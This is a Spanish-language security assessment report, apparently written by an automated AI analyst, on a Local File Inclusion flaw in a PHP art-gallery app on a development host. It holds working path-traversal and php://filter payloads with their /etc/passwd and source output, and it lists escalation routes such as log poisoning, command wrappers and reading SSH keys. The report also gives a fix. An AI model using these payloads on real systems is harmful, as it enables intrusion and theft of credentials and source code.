# Informe de Análisis de Vulnerabilidad: Local File Inclusion (LFI)

**Fecha:** 2026-04-30  
**Hora:** 15:54:49  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Analista:** Claude Sonnet 4.6 (Automatizado)

---

## 1. Resumen Ejecutivo

Se ha identificado y explotado exitosamente una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor, incluyendo archivos de configuración sensibles, código fuente PHP y archivos del sistema operativo.

**Severidad:** 🔴 CRÍTICA (CVSS: 9.1)

---

## 2. Descripción de la Aplicación

- **Nombre:** Galería de Arte Virtual
- **Tecnología:** PHP
- **Puerto:** 8081
- **Páginas identificadas:** `index.php`, `gallery.php`, `gallery.php?page=modern`, `gallery.php?page=classic`, `gallery.php?page=abstract`, `gallery.php?page=about`

---

## 3. Vulnerabilidad Detectada

### 3.1 Local File Inclusion (LFI)

**Parámetro vulnerable:** `page` en `gallery.php`  
**URL de ejemplo:** `http://web.dev.local:8081/gallery.php?page=../../../etc/passwd`

### 3.2 Análisis del Código Fuente

Mediante explotación de la vulnerabilidad con el wrapper `php://filter`, se obtuvo el código fuente del archivo `gallery.php`. El código vulnerable es el siguiente:

```php
<?php
$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
?>
```

**Causa raíz:** La aplicación incluye directamente el parámetro `page` de la URL en la función `include()` de PHP sin realizar ninguna validación o sanitización. Cuando el parámetro contiene un punto (`.`), usa el valor directamente como ruta de archivo, permitiendo rutas como `../../../etc/passwd`.

---

## 4. Explotación

### 4.1 Lectura de `/etc/passwd`

**Payload:** `../../../etc/passwd`  
**URL:** `http://web.dev.local:8081/gallery.php?page=../../../etc/passwd`

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Lectura de `/etc/hosts`

**Payload:** `../../../etc/hosts`  
**URL:** `http://web.dev.local:8081/gallery.php?page=../../../etc/hosts`

**Resultado:**
```
127.0.0.1    localhost
::1          localhost ip6-localhost ip6-loopback
172.19.0.2   d5054e367753
```

**Información obtenida:** Dirección IP del contenedor: `172.19.0.2`, hostname: `d5054e367753`

### 4.3 Lectura del Código Fuente PHP via `php://filter`

**Payload:** `php://filter/convert.base64-encode/resource=gallery.php`  
**URL:** `http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php`

Se logró leer el código fuente PHP completo de `gallery.php` codificado en Base64, lo que permite al atacante analizar la lógica interna de la aplicación y descubrir otras vulnerabilidades.

---

## 5. Impacto

| Impacto | Descripción |
|---------|-------------|
| **Confidencialidad** | Lectura de archivos arbitrarios del sistema (configuraciones, credenciales, código fuente) |
| **Integridad** | No directamente afectada (solo lectura) |
| **Disponibilidad** | No directamente afectada |
| **Escalada potencial** | Con acceso a logs o archivos escribibles, puede escalar a Remote Code Execution (RCE) mediante Log Poisoning |

### Archivos sensibles potencialmente expuestos:
- `/etc/passwd` - Lista de usuarios del sistema ✅ (confirmado)
- `/etc/hosts` - Configuración de red ✅ (confirmado)
- `/etc/shadow` - Hashes de contraseñas (requiere permisos de root)
- Código fuente PHP de la aplicación ✅ (confirmado via `php://filter`)
- Archivos de configuración de bases de datos
- Claves privadas SSH (`/root/.ssh/id_rsa`)
- Logs del sistema (`/var/log/apache2/access.log`, `/var/log/auth.log`)

---

## 6. Vectores de Ataque Adicionales

Dado que la vulnerabilidad LFI existe, los siguientes ataques avanzados son posibles:

1. **Log Poisoning → RCE:** Inyectar código PHP en los logs del servidor web y luego incluirlos via LFI.
2. **PHP Wrappers:** `php://input`, `data://`, `expect://` para ejecución de comandos.
3. **Session Poisoning:** Leer y manipular archivos de sesión PHP en `/tmp/sess_*`.
4. **Enumeración de la infraestructura:** Leer `/proc/self/environ`, `/proc/net/tcp`, etc.

---

## 7. Recomendaciones

### 7.1 Corrección Inmediata (Crítica)

```php
<?php
$page = $_GET['page'] ?? 'modern';

// Whitelist de páginas permitidas
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];

if (!in_array($page, $allowed_pages)) {
    $page = 'modern'; // Página por defecto
}

$file = "pages/" . $page . ".php";

if (file_exists($file)) {
    include($file);
}
?>
```

### 7.2 Medidas Adicionales

1. **Validación estricta:** Usar una lista blanca (whitelist) de páginas permitidas.
2. **Eliminar path traversal:** Usar `basename()` para extraer solo el nombre del archivo.
3. **Deshabilitar wrappers PHP peligrosos:** Configurar `allow_url_include = Off` en `php.ini`.
4. **Principio de mínimo privilegio:** El proceso del servidor web no debería tener acceso a archivos del sistema.
5. **WAF:** Implementar un Web Application Firewall que detecte patrones de path traversal.
6. **Auditoría de código:** Revisar toda la aplicación en busca de patrones similares.

---

## 8. Conclusiones

La aplicación "Galería de Arte Virtual" en `http://web.dev.local:8081` presenta una vulnerabilidad crítica de **Local File Inclusion** en el parámetro `page` del archivo `gallery.php`. La vulnerabilidad fue confirmada y explotada exitosamente, logrando:

- ✅ Leer el archivo `/etc/passwd` con la lista completa de usuarios del sistema
- ✅ Leer el archivo `/etc/hosts` con información de red interna
- ✅ Obtener el código fuente PHP de la aplicación mediante `php://filter`

La causa raíz es la ausencia total de validación de entrada del usuario antes de pasarlo a la función `include()` de PHP. Se recomienda aplicar las correcciones descritas con **carácter urgente**.

---

*Informe generado automáticamente por análisis de seguridad - 2026-04-30*
